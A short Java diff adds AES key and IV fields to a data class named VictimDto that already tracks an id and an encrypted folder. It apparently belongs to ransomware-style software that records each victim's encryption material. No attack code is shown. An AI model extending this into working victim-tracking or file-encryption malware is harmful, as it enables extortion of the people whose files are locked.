@@ -8,4 +8,6 @@ import lombok.Data;
 public class VictimDto {
     private String id;
     private String encryptedFolder;
+    private String aesKey;
+    private String aesIv;
 }
